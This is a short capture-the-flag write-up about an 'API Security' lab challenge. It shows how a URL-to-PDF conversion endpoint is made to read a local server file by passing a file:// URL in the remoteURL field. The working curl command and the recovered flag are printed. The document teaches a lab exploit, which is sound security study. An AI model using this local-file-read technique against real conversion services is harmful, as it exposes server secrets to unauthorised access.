# API Security

> Author : jul0105
> Date : 13.03.2021



## Challenge info

**Release** : Bundle 2 (13.03)

**Difficulty** : Medium

**Goal** : Exploit the api service. Disclose the following file from the api service: `/tmp/secret/flag.txt` and you will find the flag.



## Solve

1. The challenge provide 4 example of conversion. Three of them needs to provide a file with the request but the last one require an URL. This is interesting because it means that the API will need to reach the given URL to get the file. Here is the given example :

```bash
curl --request POST \
    --url https://<server>/convert/url \
    --header 'Content-Type: multipart/form-data' \
    --form remoteURL=https://localhost:3000 \
    --form marginTop=0 \
    --form marginBottom=0 \
    --form marginLeft=0 \
    --form marginRight=0 \
    -o url.pdf
```

2. Instead of giving an URL pointing to as web server, we'll try to get a local file: `file:///tmp/secret/flag.txt`

```bash
curl --request POST \
    --url https://5d829d42-7cb3-481a-9a6f-baa417523c3f.idocker.vuln.land/convert/url \
    --header 'Content-Type: multipart/form-data' \
    --form remoteURL=file:///tmp/secret/flag.txt \
    --form marginTop=0 \
    --form marginBottom=0 \
    --form marginLeft=0 \
    --form marginRight=0 \
    -o flag.pdf
```

3. The request is accepted by the API and content of `flag.txt` is converted to pdf.
4. And we have the flag :

```
e173ccab-b74f-4ced-b5be-0f82c4f04228
```
